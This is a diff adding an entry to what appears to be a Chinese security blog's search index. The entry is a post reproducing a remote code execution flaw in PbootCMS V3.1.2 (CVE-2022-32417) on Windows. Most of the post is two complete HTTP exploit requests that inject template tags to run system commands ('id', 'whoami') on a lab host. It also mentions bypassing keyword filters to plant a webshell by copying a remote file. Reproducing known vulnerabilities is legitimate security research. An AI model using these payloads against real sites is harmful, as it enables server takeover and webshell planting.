@@ -4,6 +4,27 @@
   
     
     <entry>
+      <title>PbootCMS V3.1.2 Rce复现以及踩坑</title>
+      <link href="2022/10/11/PbootCMS-V3-1-2-Rce%E5%A4%8D%E7%8E%B0%E4%BB%A5%E5%8F%8A%E8%B8%A9%E5%9D%91/"/>
+      <url>2022/10/11/PbootCMS-V3-1-2-Rce%E5%A4%8D%E7%8E%B0%E4%BB%A5%E5%8F%8A%E8%B8%A9%E5%9D%91/</url>
+      
+        <content type="html"><![CDATA[<p>服务器是 <code>Windows</code> 环境，测试苏安大佬的 <code>exp</code> 有问题，踩坑记录</p><hr><span id="more"></span><p>苏安大佬的文章：<a href="https://susec.me/2021/11/22/pboot-cms-V3-1-2-%E8%99%9A%E5%81%87%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0RCE/">pboot cms V3.1.2 “虚假的无文件落地RCE” - Suanve - Blog (susec.me)</a></p><p>使用苏安大佬 <code>exp</code> 测试 <code>Linux</code> 没问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index.php&#x2F;keyword?keyword&#x3D;&#125;&#123;pboot:if((get_lg&#x2F;*suanve-*&#x2F;())&#x2F;**&#x2F;(get_backurl&#x2F;*suanve-*&#x2F;()))&#125;123321suanve&#123;&#x2F;pboot:if&#125;&amp;backurl&#x3D;;id HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.88.66</span><br><span class="line">Accept: text&#x2F;plain, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;105.0.0.0 Safari&#x2F;537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.88.66&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: lg&#x3D;system; PbootSystem&#x3D;8ea446nv2usihctikbjm7qg6c6</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="../../../../img/22-10-11/image-20221011125217232.png" alt="image-20221011125217232"></p><p>但是在 <code>Windows</code> 下不成功，测试使用如下 <code>exp</code> 可执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;?member&#x2F;login&#x2F;?a&#x3D;&#125;&#123;pboot:if((get_lg&#x2F;*aaa-*&#x2F;())&#x2F;**&#x2F;(&quot;whoami&quot;))&#125;&#123;&#x2F;pboot:if&#125; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.88.66</span><br><span class="line">Accept: text&#x2F;plain, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;105.0.0.0 Safari&#x2F;537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.88.66&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: lg&#x3D;system; PbootSystem&#x3D;8ea446nv2usihctikbjm7qg6c6</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="../../../../img/22-10-11/image-20221011125710520.png" alt="image-20221011125710520"></p><p>写 <code>webshell</code> 时用 <code>file_put_contents</code> 写入时有关键字限制，存在以下关键字写不进去</p><p><img src="../../../../img/22-10-11/image-20221011125801772.png" alt="image-20221011125801772"></p><p>可使用 <code>copy</code> 函数远程落地</p><p>end!  苏安大佬nb</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> RCE </tag>
+            
+            <tag> CVE-2022-32417 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>悟空CRM密码加密脚本</title>
       <link href="2022/07/07/%E6%82%9F%E7%A9%BACRM%E5%AF%86%E7%A0%81%E5%8A%A0%E5%AF%86%E8%84%9A%E6%9C%AC/"/>
       <url>2022/07/07/%E6%82%9F%E7%A9%BACRM%E5%AF%86%E7%A0%81%E5%8A%A0%E5%AF%86%E8%84%9A%E6%9C%AC/</url>
